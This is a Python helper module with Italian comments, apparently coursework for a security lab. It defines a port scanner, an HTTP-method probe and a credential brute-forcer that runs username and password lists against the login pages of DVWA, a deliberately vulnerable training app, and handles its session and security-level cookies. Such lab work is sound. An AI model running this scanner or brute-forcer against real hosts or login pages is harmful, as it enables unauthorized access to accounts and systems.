### IMPORT MODULI ESTERNI


import http.client, socket, ipaddress, requests, time

### DEFINIZIONE FUNZIONI

#funzione per la validazione dell'indirizzo ip inserito
def is_valid_ip(ip_address):
    #se l'ip è valido ritorna True
    try:
        #ip_address riceve in input la stringa dell'ip e se non è valido genera una eccezione
        ipaddress.ip_address(ip_address)
        return True
    #se entra in exception restituisce false
    except ValueError:
        #chiedo all'utenet di inserire un IP valido
        print("Inserisci una stringa con indirizzo IP valido (e.g. 192.168.1.6) \n")
        return False
    
#funzione per la scansione multiporta su un target specifico
def scanning_port(ip, min_port, max_port, protocol_in, format):
    for port in range(min_port, max_port + 1):
        #verifica del protocollo richiesto per la creazione dell'istanza socket 
        if(protocol_in == "TCP" or protocol_in == "tcp"):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif(protocol_in == "UDP" or protocol_in == "udp"):
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        else:
            print ("Il protocollo richiesto non è valido!\n")
            return 0
        #iterazione dalla porta minima alla porta massima richiesta
        #esegue la connessione porta per porta
        status = s.connect_ex((ip, port))
        #se la connessione è OK stampa OPEN altrimenti CLOSED
        #connect_ex ritorna 0 in caso di successo
        #gli if sulla variabile format servono a verificare il formato di output scelto dall'utente
        if (status == 0):
             if(format == 1 or format == 3):
                print ('Porta ', port, ' ', protocol_in, ' OPEN')
        else:
            if(format == 2 or format == 3):
                print ('Porta ', port, ' ', protocol_in, ' CLOSED')
        #chiusura della connessione
        s.close()

#funzione per la restituzione dello status code del metodo http indicato
def get_status_http_method(ip, port, path, http_method):
    #N.B. --> 405 Method Not Allowed
    #inizializzo la variabile response per check successivo
    response = None
    #try-except per gestire l'eccezzione nella connessione
    try:
        #la funzione http.client.HTTPConnection prende in input i parametri host, porta.
        #la funzione restituisce l’oggetto connection. 
        connection = http.client.HTTPConnection(ip, port)
        #invio richiesta indicando metodo e path per RequestURI
        connection.request(http_method, path)
        #salvataggio risposta server
        response = connection.getresponse()
        #print ("I metodi abilitati sono: ", response.getheader('Allow'))
        #chiusura connessione
        connection.close()
        #return con valori contenuti nel tag Allow
    #gestione eccezione Connessione e stampa errore
    except ConnectionRefusedError:
        print ("Connessione fallita!")
    #Se response è None non è stato possibile connettersi e ritorno uno status code di errore
    if(response):
        #nel caso del method OPTIONS va restituito un tag dell'header e non lo status
        if(http_method == "OPTIONS"):
            return response.getheader('Allow')
            #se il metodo non è OPTIONS dovrò sempre restituire lo status
        else:
            return response.status
    else:
        #restituisco un valore corrispondente ad un error code status
        return 500

def brute_force(user_list, pwd_list, ip, context, possible_err_msg, security_lev, cookies = None):
    url_login = "http://" + ip + context
    error_msg = possible_err_msg
    for user in user_list:
        user = user.rstrip()
        for pwd in pwd_list:
            pwd = pwd.rstrip()
            payload_form_login = {'username': user, 'password': pwd, 'Login': 'Login'} 
            if(cookies == None):
                 print ("Attacco bruteforce login.php!\n")
                 print (user, "-", pwd)
                 sess_id = get_session_id(payload_form_login, url_login)
                 cookie_session = {'security': security_lev, 'PHPSESSID': sess_id}
                 check_credentials = check_login_post(payload_form_login, url_login, cookie_session, error_msg)
                 if(check_credentials == 1):
                    print("Session ID:", sess_id)
                    msg_failed_brute = '<pre><br>Username and/or password incorrect.</pre>'
                    brute_force(user_list, pwd_list, ip, "/dvwa/vulnerabilities/brute/", msg_failed_brute, security_lev, cookie_session)
                 else:
                    print("Credenziali non valide!")
            else:
                 print ("       Attacco bruteforce context /vulnerabilities/brute/!\n")
                 print ("       ",user, "-", pwd)
                 new_check_credentials = check_login_get(payload_form_login, url_login, cookies, error_msg)
                 if(new_check_credentials == 1):
                      return 0
                 if(security_lev == "high"):
                      time.sleep(4)

def check_login_post(payload, url, cookie, error_msg):
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        
        target_page_obj_post = requests.post(url, headers = headers_login, cookies = cookie ,data = payload)
        if(error_msg in target_page_obj_post.text):
             print("Login /login.php KO!\n")
             return 0
        else:
             print("Login /login.php OK!\n")
             return 1

def check_login_get(payload, url, cookie, error_msg):
        headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
        target_page_obj_get = requests.get(url, headers = headers_login, cookies = cookie , params = payload)
        if(error_msg in target_page_obj_get.text):
             print("       Login /dvwa/vulnerabilities/brute/ KO!\n")
             return 0
        else:
            print("        Login /dvwa/vulnerabilities/brute/ OK!\n")
            return 1
        
def get_session_id(payload, url):
    headers_login = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"}
    session = requests.Session() 
    target_page_obj_sess = session.get(url, headers = headers_login, params = payload)
    phpsessid = target_page_obj_sess.cookies['PHPSESSID']
    return phpsessid
